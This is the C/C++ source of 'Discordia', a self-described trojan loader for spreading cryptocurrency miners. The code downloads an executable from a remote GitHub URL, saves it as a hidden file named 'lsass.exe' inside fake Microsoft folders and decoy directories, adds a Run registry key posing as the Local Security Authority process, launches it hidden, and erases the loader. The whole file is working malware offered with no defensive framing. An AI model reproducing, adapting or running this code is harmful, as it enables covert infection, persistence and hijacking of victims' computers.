/*
	# Discordia
	Discordia it's trojan for dissemination miners. Discordia written in C / C++.

	## Features
	* Hiding miner files
	* Prevents closing of miner (Windows 7 and older)
	*

	## Author
	Alexandr Foxovsky (foxovsky.me)

*/

#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include <direct.h>
#include <Wininet.h>
#pragma comment (lib, "urlmon.lib")
#pragma comment (lib, "Wininet.lib")

using namespace std;

void Install()
{
	// check internet connection status
	if (!InternetCheckConnection(L"https://ya.ru", FLAG_ICC_FORCE_CONNECTION, 0))
	{
		Sleep(60000);// sleep 1 minute
		Install();
		return;
	}

	// create dirs
	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation", NULL);
	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Windows", NULL);
	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData", NULL);

	//fake dirs
	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\DRM", NULL);
	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Network", NULL);
	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Windows NT", NULL);
	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Search", NULL);
	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Data", NULL);
	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Vault", NULL);
	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Temp", NULL);

	//fake files
	system("rem > C:\\ProgramData\\Microsoft Corporation\\temp.log");

	// download discordia
	URLDownloadToFile(0, L"https://github.com/foxovsky/PointBlank/raw/master/server/Auth/bin/Release/Game.exe", L"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\lsass.exe", 0, 0);

	// update file attributes
	BOOL result = SetFileAttributes(L"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\lsass.exe", FILE_ATTRIBUTE_HIDDEN);

	// update dirs attributes
	system("attrib \"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\" +h");

	// add to autoload
	system("REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Local Security Authority Process\" /t REG_SZ /F /D \"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\lsass.exe\"");

	// starting malware
	WinExec("C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\lsass.exe", SW_HIDE);

	// suicide loader
	char current_work_dir[FILENAME_MAX];
	_getcwd(current_work_dir, sizeof(current_work_dir));
	string path = "taskkill /im Loader.exe /f & sleep 1000 & erase " + (string)current_work_dir + "\\Loader.exe & sleep 1000 & exit";
	system(path.c_str());
}

int main()
{
	// hide console
	/*HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);*/

	try
	{
		Install();
	}
	catch (...)
	{
		Install();
	}

    return 0;
}